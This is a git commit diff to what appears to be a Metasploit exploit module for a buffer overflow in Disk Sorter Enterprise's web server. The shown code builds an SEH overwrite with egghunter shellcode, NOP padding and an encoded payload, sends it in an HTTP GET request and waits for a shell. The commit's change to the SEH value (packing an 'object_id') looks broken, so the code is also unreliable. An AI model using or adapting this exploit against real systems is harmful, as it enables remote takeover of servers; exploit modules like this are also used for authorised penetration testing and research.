6a9b94a53f29d38822a71796ed26a84a02657926
Carter <cbawsome77@gmail.com>
2017-03-22 09:34:04 -0400

    Fix constant assignment error

--- disk sorter enterprise/disk_sorter_get_bof.rb
+++ disk sorter enterprise/disk_sorter_get_bof.rb
@@ -6,7 +6,7 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Exploit::Remote
-  Rank = GreatRanking
+  Rank = AverageRanking
 
   include Msf::Exploit::Remote::HttpClient
 
@@ -50,20 +50,20 @@ class MetasploitModule < Msf::Exploit::Remote
     #JMP Short = EB 05
     nSEH = "\x90\x90\xEB\x05" #Jump short 5
 
-    SEH = [0x268525566].pack('L<')  # Need to check this
+    seh = [0x268525566.object_id].pack('L<')
 
     egg = "w00tw00t"
     egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
-    egghunter.concat("\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7") 
+    egghunter.concat("\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
 
     nops = "\x90"
 
     # The final payload with nops and all the good stuff
-    payload_final = junk + nSEH + SEH + egghunter + nops * 10 + egg + payload.encoded + nops * (6000 - junk.length - nSEH.length - SEH.length - egghunter.length - 10 - egg.length - payload.encoded.length)
-
+    payload_final = junk + nSEH + seh + egghunter + nops * 10 + egg + payload.encoded + nops * (6000 - junk.length - nSEH.length - seh.length - egghunter.length - 10 - egg.length - payload.encoded.length)
+    vprint_status("Final payload length: #{payload_final.length}")
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => "/#{payload_final}"
+      'uri'    => '/' + payload_final
       })
     print_status('Waiting for shell...')
     handler
